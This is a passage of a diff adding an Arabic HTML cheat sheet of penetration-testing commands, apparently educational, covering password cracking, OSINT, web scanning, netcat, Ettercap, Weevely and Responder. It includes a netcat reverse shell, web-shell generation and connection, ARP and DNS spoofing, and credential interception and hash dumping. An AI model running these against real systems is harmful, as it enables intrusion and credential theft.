+                    <tr><td>تطبيق قواعد لتوليد كلمات مرور أكثر</td><td><pre>john --rules --wordlist=rockyou.txt hash.txt</pre></td></tr>
+                    <tr><td>تجربة كل التركيبات الممكنة</td><td><pre>john --incremental hash.txt</pre></td></tr>
+                    <tr><td>استخدام 4 Threads لتسريع الكسر</td><td><pre>john --fork=4 hash.txt</pre></td></tr>
+                    <tr><td>استئناف جلسة كسر متوقفة</td><td><pre>john --restore</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>9. Maltego - الاستطلاع مفتوح المصدر (OSINT)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الاستخدام (واجهة رسومية)</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>إنشاء مشروع جديد</td><td><pre>بدء جمع معلومات OSINT على نطاق وهمي</pre></td></tr>
+                    <tr><td>جمع سجلات DNS لنطاق وهمي</td><td><pre>تحويل Domain → DNS Records</pre></td></tr>
+                    <tr><td>معرفة عنوان IP للنطاق</td><td><pre>تحويل Domain → IP Address</pre></td></tr>
+                    <tr><td>جمع بريد إلكتروني وهمي للتدريب</td><td><pre>تحويل Person → Email</pre></td></tr>
+                    <tr><td>معرفة النطاق المرتبط بالبريد</td><td><pre>تحويل Email → Domain</pre></td></tr>
+                    <tr><td>جمع حسابات وسائل التواصل</td><td><pre>تحويل Domain → Social Media</pre></td></tr>
+                    <tr><td>تحديد الموقع الجغرافي الوهمي</td><td><pre>تحويل IP → Geolocation</pre></td></tr>
+                    <tr><td>جمع بيانات عامة عن شخص وهمي</td><td><pre>تحويل Person → LinkedIn</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>10. Hashcat - كسر الـ Hashes (GPU Accelerated)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>كسر MD5 باستخدام قائمة كلمات</td><td><pre>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</pre></td></tr>
+                    <tr><td>كسر SHA1</td><td><pre>hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</pre></td></tr>
+                    <tr><td>كسر SHA256</td><td><pre>hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</pre></td></tr>
+                    <tr><td>هجوم Brute-force 4 أحرف</td><td><pre>hashcat -m 0 -a 3 hash.txt ?a?a?a?a</pre></td></tr>
+                    <tr><td>حفظ كلمات المرور المكتشفة</td><td><pre>hashcat -m 0 -a 0 -o found.txt hash.txt wordlist.txt</pre></td></tr>
+                    <tr><td>إجبار الأداة على العمل رغم التحذيرات</td><td><pre>hashcat -m 0 --force hash.txt wordlist.txt</pre></td></tr>
+                    <tr><td>هجوم Mask مع كلمات + أرقام</td><td><pre>hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d</pre></td></tr>
+                    <tr><td>تجربة طول كلمات متغير</td><td><pre>hashcat -m 0 --increment hash.txt wordlist.txt</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>11. Nikto - ماسح ثغرات الويب</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فحص موقع الهدف للكشف عن الثغرات</td><td><pre>nikto -h &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>فحص HTTP للنطاق أو العنوان الهدف</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt;</pre></td></tr>
+                    <tr><td>فحص منفذ محدد على الهدف</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -p 80</pre></td></tr>
+                    <tr><td>حفظ النتائج في ملف</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -o output.txt</pre></td></tr>
+                    <tr><td>حفظ بصيغة نصية</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -Format txt</pre></td></tr>
+                    <tr><td>تخصيص فحوص محددة</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -Tuning x</pre></td></tr>
+                    <tr><td>عرض النتائج Verbose</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -Display V</pre></td></tr>
+                    <tr><td>فحص HTTPS على الهدف</td><td><pre>nikto -h http://&lt;TARGET_HOST&gt; -ssl</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>12. OpenVAS - إدارة الثغرات على مستوى المؤسسات</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>إعداد OpenVAS لأول مرة</td><td><pre>openvas-setup</pre></td></tr>
+                    <tr><td>تشغيل OpenVAS</td><td><pre>openvas-start</pre></td></tr>
+                    <tr><td>عرض جميع المهام</td><td><pre>omp -u admin -w password --get-tasks</pre></td></tr>
+                    <tr><td>إنشاء هدف جديد</td><td><pre>omp -u admin -w password --create-target --name "TargetHost" --hosts &lt;TARGET_IP&gt;</pre></td></tr>
+                    <tr><td>إنشاء مهمة مسح على الهدف</td><td><pre>omp -u admin -w password --create-task --name "Scan Target"</pre></td></tr>
+                    <tr><td>بدء المسح</td><td><pre>omp -u admin -w password --start-task &lt;TASK_ID&gt;</pre></td></tr>
+                    <tr><td>استخراج التقرير</td><td><pre>omp -u admin -w password --get-report &lt;REPORT_ID&gt;</pre></td></tr>
+                    <tr><td>حذف المهمة</td><td><pre>omp -u admin -w password --delete-task &lt;TASK_ID&gt;</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>13. Netcat - الأداة السويسرية للشبكات</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>الاستماع على منفذ 4444 (عادة على جهاز المهاجم)</td><td><pre>nc -lvp 4444</pre></td></tr>
+                    <tr><td>الاتصال بمنفذ الهدف</td><td><pre>nc &lt;TARGET_IP&gt; 4444</pre></td></tr>
+                    <tr><td>إرسال رسالة نصية عبر الاتصال إلى الهدف</td><td><pre>echo "hello" | nc &lt;TARGET_IP&gt; 4444</pre></td></tr>
+                    <tr><td>اختبار اتصال HTTP إلى الهدف</td><td><pre>nc -v -n &lt;TARGET_IP&gt; 80</pre></td></tr>
+                    <tr><td>فحص المنافذ المفتوحة على الهدف</td><td><pre>nc -zv &lt;TARGET_IP&gt; 1-1000</pre></td></tr>
+                    <tr><td>استقبال ملف (على جهاز الاستقبال)</td><td><pre>nc -l 1234 > received.txt</pre></td></tr>
+                    <tr><td>إرسال ملف إلى الهدف</td><td><pre>nc &lt;TARGET_IP&gt; 1234 < send.txt</pre></td></tr>
+                    <tr><td>فتح Reverse Shell تعليمي (لا تستخدم إلا في بيئة مختبر محمي)</td><td><pre>nc -e /bin/bash &lt;TARGET_IP&gt; 4444</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>14. Ettercap - هجمات Man-in-the-Middle</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>فتح واجهة رسومية</td><td><pre>ettercap -G</pre></td></tr>
+                    <tr><td>بدء التقاط الحزم على الواجهة المحلية بدون واجهة رسومية</td><td><pre>ettercap -T -q -i lo</pre></td></tr>
+                    <tr><td>هجوم ARP تعليمي على نطاق التدريب</td><td><pre>ettercap -M arp:remote /&lt;TARGET_IP&gt;/ /&lt;TARGET_IP&gt;/</pre></td></tr>
+                    <tr><td>الوضع الصامت</td><td><pre>ettercap -S</pre></td></tr>
+                    <tr><td>حفظ اللوجات</td><td><pre>ettercap -L logfile</pre></td></tr>
+                    <tr><td>اختبار DNS Spoof على شبكة وهمية</td><td><pre>ettercap -T -i lo -P dns_spoof</pre></td></tr>
+                    <tr><td>اختبار اعتراض SSH محليًا</td><td><pre>ettercap -T -i lo -P ssh_key</pre></td></tr>
+                    <tr><td>اعتراض كلمات مرور FTP محليًا</td><td><pre>ettercap -T -i lo -P ftp_pass</pre></td></tr>
+                </tbody>
+            </table>
+            
+            <h3>15. Dirb / Dirbuster - تعداد محتوى الويب</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>مسح المجلدات والملفات الشائعة</td><td><pre>dirb http://&lt;TARGET_HOST&gt;</pre></td></tr>
+                    <tr><td>استخدام قائمة كلمات مخصصة</td><td><pre>dirb http://&lt;TARGET_HOST&gt; /path/to/custom/wordlist.txt</pre></td></tr>
+                    <tr><td>تخمين امتدادات ملفات محددة</td><td><pre>dirb http://&lt;TARGET_HOST&gt; -X .php,.html</pre></td></tr>
+                    <tr><td>استخدام HTTP HEAD بدلاً من GET (أسرع)</td><td><pre>dirb http://&lt;TARGET_HOST&gt; -H</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>16. The Harvester - جمع معلومات OSINT</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>جمع الإيميلات والنطاقات الفرعية من جوجل ولينكدإن</td><td><pre>theharvester -d target.com -b google,linkedin -l 500</pre></td></tr>
+                    <tr><td>جمع جميع البيانات المتاحة</td><td><pre>theharvester -d target.com -b all</pre></td></tr>
+                    <tr><td>حفظ النتائج بصيغة XML</td><td><pre>theharvester -d target.com -b all -f report.xml</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>17. Volatility - التحليل الجنائي للذاكرة (Memory Forensics)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>تحديد ملف التعريف (Profile) لنظام ويندوز 7</td><td><pre>volatility -f memory.dmp --profile=Win7SP1x64 imageinfo</pre></td></tr>
+                    <tr><td>عرض قائمة العمليات الجارية في الذاكرة</td><td><pre>volatility -f memory.dmp --profile=Win7SP1x64 pslist</pre></td></tr>
+                    <tr><td>استخراج كلمات المرور المشفرة (Hashes) من الذاكرة</td><td><pre>volatility -f memory.dmp --profile=Win7SP1x64 hashdump</pre></td></tr>
+                    <tr><td>فحص اتصالات الشبكة في الذاكرة</td><td><pre>volatility -f memory.dmp --profile=Win7SP1x64 netscan</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>18. Weevely - فتح Backdoor للويب (Web Shell)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>توليد Web Shell خفي (للتدريب)</td><td><pre>weevely generate password /var/www/html/back.php</pre></td></tr>
+                    <tr><td>الاتصال بـ Web Shell بعد زرعه على الهدف</td><td><pre>weevely http://&lt;TARGET_HOST&gt;/back.php password</pre></td></tr>
+                    <tr><td>فتح Shell نظام بعد الاتصال</td><td><pre>shell_exec ls -la</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>19. Recon-ng - إطار عمل استطلاعي (OSINT)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>تشغيل إطار العمل</td><td><pre>recon-ng</pre></td></tr>
+                    <tr><td>إضافة نطاق جديد للاستطلاع</td><td><pre>add domains target.com</pre></td></tr>
+                    <tr><td>استخدام وحدة (Module) معينة</td><td><pre>use recon/domains-hosts/google_site_web</pre></td></tr>
+                    <tr><td>بدء التشغيل</td><td><pre>run</pre></td></tr>
+                </tbody>
+            </table>
+
+            <h3>20. Responder - هجمات اعتراض التوثيق (LLMNR/NBT-NS)</h3>
+            <table>
+                <thead>
+                    <tr><th>الوصف</th><th>الأمر التنفيذي</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>بدء تشغيل Responder للاستماع على الواجهة</td><td><pre>sudo responder -I eth0</pre></td></tr>
+                    <tr><td>تشغيله في وضع التحليل (بدون هجوم)</td><td><pre>sudo responder -I eth0 -A</pre></td></tr>
+                    <tr><td>إيقاف هجمات SMB/HTTP (لتركيز على LLMNR)</td><td><pre>sudo responder -I eth0 -rF</pre></td></tr>
+                </tbody>
+            </table>
+        </section>
+
+        <footer>
+            <p dir="rtl">&copy; 2025 Qusay_kali - Cyber Security Intermediate level </p>
+            <div class="social-links">
+                <a href="https://www.instagram.com/qusay_kali1/" target="_blank" rel="noopener noreferrer">Instagram</a>
+                <a href="https://www.youtube.com/@Qusay_kali" target="_blank" rel="noopener noreferrer">YouTube</a>
+                <a href="https://t.me/Qusay_kali" target="_blank" rel="noopener noreferrer">Telegram</a>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
